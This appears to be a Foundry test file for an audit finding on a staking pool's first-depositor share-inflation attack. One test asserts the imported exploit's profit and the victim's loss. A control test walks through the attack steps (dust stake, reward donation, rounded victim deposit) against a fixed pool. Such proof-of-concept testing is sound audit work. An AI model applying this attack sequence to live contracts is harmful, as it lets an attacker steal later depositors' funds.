// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, ZealToken, ZealPoolFixed, ZealVictimFixed} from
    "./62427-zls1-2-first-depositor-can-front-run-and-steal-the-next-user.sol";

contract Finding62427Test is Test {
    function test_exploit_rounds_next_stake_to_one_share() public {
        Exploit e = new Exploit();
        uint256 start = e.token().balanceOf(address(e));
        e.run();
        uint256 endBal = e.token().balanceOf(address(e));
        assertEq(start, 501e18, "started with 1 plus X/2");
        assertEq(endBal, 751e18 - 1, "ends with donation dust plus 750");
        assertEq(endBal - start, 250e18 - 1, "profit X/4 - 1");
        assertEq(e.pool().shares(address(e.victim())), 1, "victim has 1 share");
        assertEq(e.token().balanceOf(address(e.victim())), 0, "victim paid 1000");
    }

    function test_control_offset_rejects_inflated_stake() public {
        ZealToken token = new ZealToken();
        ZealPoolFixed pool = new ZealPoolFixed(token);
        ZealVictimFixed victim = new ZealVictimFixed(token, pool);
        uint256 x = 1_000e18;
        token.mint(address(this), 1e18 + x / 2);
        token.mint(address(victim), x);
        token.approve(address(pool), type(uint256).max);
        pool.stake(1e18);
        pool.unstake(1e18 - 1);
        pool.addRewards(x / 2);
        uint256 attackerBefore = token.balanceOf(address(this));

        bool stole = true;
        try victim.deposit(x) {
            stole = true;
        } catch {
            stole = false;
        }
        assertFalse(stole, "fixed pool rejects the rounded stake");
        assertEq(token.balanceOf(address(victim)), x, "victim kept 1000");
        pool.unstake(pool.shares(address(this)));
        assertLe(token.balanceOf(address(this)), attackerBefore + 1e18, "no victim funds");
    }
}
